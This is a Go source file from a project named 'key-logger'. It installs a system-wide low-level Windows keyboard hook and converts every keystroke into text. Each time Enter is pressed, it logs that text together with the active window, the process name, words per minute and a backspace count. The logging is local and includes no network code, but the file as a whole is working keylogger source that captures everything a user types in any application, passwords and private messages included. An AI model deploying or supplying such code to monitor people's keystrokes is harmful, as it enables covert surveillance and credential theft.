package key

import (
	"strings"
	"sync"
	"time"
	"unsafe"

	"github.com/go-kit/kit/log"
	"github.com/go-kit/kit/log/level"
	"github.com/gonutz/w32/v2"

	"key-logger/pkg/window"
)

type key struct {
	cb callback
}

func New(logger log.Logger, w *window.Window) *key {
	cb := callback{
		logger:  logger,
		w:       w,
		keyChan: make(chan w32.DWORD, 100),
	}

	go func() {
		cb.loop()
	}()

	hk := w32.SetWindowsHookEx(w32.WH_KEYBOARD_LL, cb.keyboardCallback, 0, 0)
	//defer func() {
	//	w32.UnhookWindowsHookEx(hk)
	//}()
	cb.hook = hk

	go func() {
		var msg w32.MSG
		//It's required to "pump" the message loop
		for w32.GetMessage(&msg, 0, 0, 0) != 0 {
		}
	}()

	return &key{cb: cb}

}

type callback struct {
	logger      log.Logger
	hook        w32.HHOOK
	w           *window.Window
	mtx         sync.Mutex
	keyChan     chan w32.DWORD
	currentText string
	backCounter int
	charCounter int
	startTime   time.Time
}

func (c *callback) keyboardCallback(nCode int, wparam w32.WPARAM, lParam w32.LPARAM) w32.LRESULT {
	if nCode == 0 && wparam == w32.WM_KEYDOWN {
		k := (*w32.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		select {
		case c.keyChan <- k.VkCode:
		default:
		}
	}
	return w32.CallNextHookEx(c.hook, nCode, wparam, lParam)
}

func (c *callback) checkTimer() {
	if len(c.currentText) == 0 {
		c.startTime = time.Now()
	}
}

func (c *callback) loop() {
	for {
		select {
		case k := <-c.keyChan:
			c.mtx.Lock()
			switch k {
			case w32.VK_RETURN:
				words := len(strings.Split(c.currentText, " "))
				dur := time.Since(c.startTime)
				wpm := float64(words) / dur.Minutes()
				c.charCounter++ // Enter counts as a key
				level.Info(c.logger).Log("ts", time.Now(), "type", "key-event", "window", c.w.GetActiveWindowName(), "process", c.w.GetActiveProcess(), "words", words, "backspace_count", c.backCounter, "duration", dur, "wpm", wpm, "text", c.currentText, "chars", c.charCounter)
				c.currentText = ""
				c.backCounter = 0
				c.charCounter = 0
			case w32.VK_CONTROL:
				c.checkTimer()
				c.currentText += "[Ctrl]"
				c.charCounter++
			case w32.VK_BACK:
				c.checkTimer()
				sz := len(c.currentText)
				if sz > 0 {
					c.currentText = c.currentText[:sz-1]
				}
				c.backCounter++
				c.charCounter++
			case w32.VK_TAB:
				c.checkTimer()
				c.currentText += "[Tab]"
				c.charCounter++
			case w32.VK_SHIFT:
				c.checkTimer()
				c.currentText += "[Shift]"
				c.charCounter++
			case w32.VK_MENU:
				c.checkTimer()
				c.currentText += "[Alt]"
				c.charCounter++
			case w32.VK_CAPITAL:
				c.checkTimer()
				c.currentText += "[CapsLock]"
				c.charCounter++
			case w32.VK_ESCAPE:
				c.checkTimer()
				c.currentText += "[Esc]"
				c.charCounter++
			case w32.VK_SPACE:
				c.checkTimer()
				c.currentText += " "
				c.charCounter++
			case w32.VK_PRIOR:
				c.checkTimer()
				c.currentText += "[PageUp]"
				c.charCounter++
			case w32.VK_NEXT:
				c.checkTimer()
				c.currentText += "[PageDown]"
				c.charCounter++
			case w32.VK_END:
				c.checkTimer()
				c.currentText += "[End]"
				c.charCounter++
			case w32.VK_HOME:
				c.checkTimer()
				c.currentText += "[Home]"
				c.charCounter++
			case w32.VK_LEFT:
				c.checkTimer()
				c.currentText += "[Left]"
				c.charCounter++
			case w32.VK_UP:
				c.checkTimer()
				c.currentText += "[Up]"
				c.charCounter++
			case w32.VK_RIGHT:
				c.checkTimer()
				c.currentText += "[Right]"
				c.charCounter++
			case w32.VK_DOWN:
				c.checkTimer()
				c.currentText += "[Down]"
				c.charCounter++
			case w32.VK_SELECT:
				c.checkTimer()
				c.currentText += "[Select]"
				c.charCounter++
			case w32.VK_PRINT:
				c.checkTimer()
				c.currentText += "[Print]"
				c.charCounter++
			case w32.VK_EXECUTE:
				c.checkTimer()
				c.currentText += "[Execute]"
				c.charCounter++
			case w32.VK_SNAPSHOT:
				c.checkTimer()
				c.currentText += "[PrintScreen]"
				c.charCounter++
			case w32.VK_INSERT:
				c.checkTimer()
				c.currentText += "[Insert]"
				c.charCounter++
			case w32.VK_DELETE:
				c.checkTimer()
				c.currentText += "[Delete]"
				c.charCounter++
			case w32.VK_HELP:
				c.checkTimer()
				c.currentText += "[Help]"
				c.charCounter++
			case w32.VK_LWIN:
				c.checkTimer()
				c.currentText += "[LeftWindows]"
				c.charCounter++
			case w32.VK_RWIN:
				c.checkTimer()
				c.currentText += "[RightWindows]"
				c.charCounter++
			case w32.VK_APPS:
				c.checkTimer()
				c.currentText += "[Applications]"
				c.charCounter++
			case w32.VK_SLEEP:
				c.checkTimer()
				c.currentText += "[Sleep]"
				c.charCounter++
			case w32.VK_NUMPAD0:
				c.checkTimer()
				c.currentText += "[Pad 0]"
				c.charCounter++
			case w32.VK_NUMPAD1:
				c.checkTimer()
				c.currentText += "[Pad 1]"
				c.charCounter++
			case w32.VK_NUMPAD2:
				c.checkTimer()
				c.currentText += "[Pad 2]"
				c.charCounter++
			case w32.VK_NUMPAD3:
				c.checkTimer()
				c.currentText += "[Pad 3]"
				c.charCounter++
			case w32.VK_NUMPAD4:
				c.checkTimer()
				c.currentText += "[Pad 4]"
				c.charCounter++
			case w32.VK_NUMPAD5:
				c.checkTimer()
				c.currentText += "[Pad 5]"
				c.charCounter++
			case w32.VK_NUMPAD6:
				c.checkTimer()
				c.currentText += "[Pad 6]"
				c.charCounter++
			case w32.VK_NUMPAD7:
				c.checkTimer()
				c.currentText += "[Pad 7]"
				c.charCounter++
			case w32.VK_NUMPAD8:
				c.checkTimer()
				c.currentText += "[Pad 8]"
				c.charCounter++
			case w32.VK_NUMPAD9:
				c.checkTimer()
				c.currentText += "[Pad 9]"
				c.charCounter++
			case w32.VK_MULTIPLY:
				c.checkTimer()
				c.currentText += "*"
				c.charCounter++
			case w32.VK_ADD:
				c.checkTimer()
				c.currentText += "+"
				c.charCounter++
			case w32.VK_SEPARATOR:
				c.checkTimer()
				c.currentText += "[Separator]"
				c.charCounter++
			case w32.VK_SUBTRACT:
				c.checkTimer()
				c.currentText += "-"
				c.charCounter++
			case w32.VK_DECIMAL:
				c.checkTimer()
				c.currentText += "."
				c.charCounter++
			case w32.VK_DIVIDE:
				c.checkTimer()
				c.currentText += "[Divide]"
				c.charCounter++
			case w32.VK_F1:
				c.checkTimer()
				c.currentText += "[F1]"
				c.charCounter++
			case w32.VK_F2:
				c.checkTimer()
				c.currentText += "[F2]"
				c.charCounter++
			case w32.VK_F3:
				c.checkTimer()
				c.currentText += "[F3]"
				c.charCounter++
			case w32.VK_F4:
				c.checkTimer()
				c.currentText += "[F4]"
				c.charCounter++
			case w32.VK_F5:
				c.checkTimer()
				c.currentText += "[F5]"
				c.charCounter++
			case w32.VK_F6:
				c.checkTimer()
				c.currentText += "[F6]"
				c.charCounter++
			case w32.VK_F7:
				c.checkTimer()
				c.currentText += "[F7]"
				c.charCounter++
			case w32.VK_F8:
				c.checkTimer()
				c.currentText += "[F8]"
				c.charCounter++
			case w32.VK_F9:
				c.checkTimer()
				c.currentText += "[F9]"
				c.charCounter++
			case w32.VK_F10:
				c.checkTimer()
				c.currentText += "[F10]"
				c.charCounter++
			case w32.VK_F11:
				c.checkTimer()
				c.currentText += "[F11]"
				c.charCounter++
			case w32.VK_F12:
				c.checkTimer()
				c.currentText += "[F12]"
				c.charCounter++
			case w32.VK_NUMLOCK:
				c.checkTimer()
				c.currentText += "[NumLock]"
				c.charCounter++
			case w32.VK_SCROLL:
				c.checkTimer()
				c.currentText += "[ScrollLock]"
				c.charCounter++
			case w32.VK_LSHIFT:
				c.checkTimer()
				c.currentText += "[LeftShift]"
				c.charCounter++
			case w32.VK_RSHIFT:
				c.checkTimer()
				c.currentText += "[RightShift]"
				c.charCounter++
			case w32.VK_LCONTROL:
				c.checkTimer()
				c.currentText += "[LeftCtrl]"
				c.charCounter++
			case w32.VK_RCONTROL:
				c.checkTimer()
				c.currentText += "[RightCtrl]"
				c.charCounter++
			case w32.VK_LMENU:
				c.checkTimer()
				c.currentText += "[LeftAlt]"
				c.charCounter++
			case w32.VK_RMENU:
				c.checkTimer()
				c.currentText += "[RightAlt]"
				c.charCounter++
			case w32.VK_OEM_1:
				c.checkTimer()
				c.currentText += ";"
				c.charCounter++
			case w32.VK_OEM_2:
				c.checkTimer()
				c.currentText += "/"
				c.charCounter++
			case w32.VK_OEM_3:
				c.checkTimer()
				c.currentText += "`"
				c.charCounter++
			case w32.VK_OEM_4:
				c.checkTimer()
				c.currentText += "["
				c.charCounter++
			case w32.VK_OEM_5:
				c.checkTimer()
				c.currentText += "\\"
				c.charCounter++
			case w32.VK_OEM_6:
				c.checkTimer()
				c.currentText += "]"
				c.charCounter++
			case w32.VK_OEM_7:
				c.checkTimer()
				c.currentText += "'"
				c.charCounter++
			case w32.VK_OEM_PERIOD:
				c.checkTimer()
				c.currentText += "."
				c.charCounter++
			case 0x30:
				c.checkTimer()
				c.currentText += "0"
				c.charCounter++
			case 0x31:
				c.checkTimer()
				c.currentText += "1"
				c.charCounter++
			case 0x32:
				c.checkTimer()
				c.currentText += "2"
				c.charCounter++
			case 0x33:
				c.checkTimer()
				c.currentText += "3"
				c.charCounter++
			case 0x34:
				c.checkTimer()
				c.currentText += "4"
				c.charCounter++
			case 0x35:
				c.checkTimer()
				c.currentText += "5"
				c.charCounter++
			case 0x36:
				c.checkTimer()
				c.currentText += "6"
				c.charCounter++
			case 0x37:
				c.checkTimer()
				c.currentText += "7"
				c.charCounter++
			case 0x38:
				c.checkTimer()
				c.currentText += "8"
				c.charCounter++
			case 0x39:
				c.checkTimer()
				c.currentText += "9"
				c.charCounter++
			case 0x41:
				c.checkTimer()
				c.currentText += "a"
				c.charCounter++
			case 0x42:
				c.checkTimer()
				c.currentText += "b"
				c.charCounter++
			case 0x43:
				c.checkTimer()
				c.currentText += "c"
				c.charCounter++
			case 0x44:
				c.checkTimer()
				c.currentText += "d"
				c.charCounter++
			case 0x45:
				c.checkTimer()
				c.currentText += "e"
				c.charCounter++
			case 0x46:
				c.checkTimer()
				c.currentText += "f"
				c.charCounter++
			case 0x47:
				c.checkTimer()
				c.currentText += "g"
				c.charCounter++
			case 0x48:
				c.checkTimer()
				c.currentText += "h"
				c.charCounter++
			case 0x49:
				c.checkTimer()
				c.currentText += "i"
				c.charCounter++
			case 0x4A:
				c.checkTimer()
				c.currentText += "j"
				c.charCounter++
			case 0x4B:
				c.checkTimer()
				c.currentText += "k"
				c.charCounter++
			case 0x4C:
				c.checkTimer()
				c.currentText += "l"
				c.charCounter++
			case 0x4D:
				c.checkTimer()
				c.currentText += "m"
				c.charCounter++
			case 0x4E:
				c.checkTimer()
				c.currentText += "n"
				c.charCounter++
			case 0x4F:
				c.checkTimer()
				c.currentText += "o"
				c.charCounter++
			case 0x50:
				c.checkTimer()
				c.currentText += "p"
				c.charCounter++
			case 0x51:
				c.checkTimer()
				c.currentText += "q"
				c.charCounter++
			case 0x52:
				c.checkTimer()
				c.currentText += "r"
				c.charCounter++
			case 0x53:
				c.checkTimer()
				c.currentText += "s"
				c.charCounter++
			case 0x54:
				c.checkTimer()
				c.currentText += "t"
				c.charCounter++
			case 0x55:
				c.checkTimer()
				c.currentText += "u"
				c.charCounter++
			case 0x56:
				c.checkTimer()
				c.currentText += "v"
				c.charCounter++
			case 0x57:
				c.checkTimer()
				c.currentText += "w"
				c.charCounter++
			case 0x58:
				c.checkTimer()
				c.currentText += "x"
				c.charCounter++
			case 0x59:
				c.checkTimer()
				c.currentText += "y"
				c.charCounter++
			case 0x5A:
				c.checkTimer()
				c.currentText += "z"
				c.charCounter++
			}
			c.mtx.Unlock()
		}
	}
}
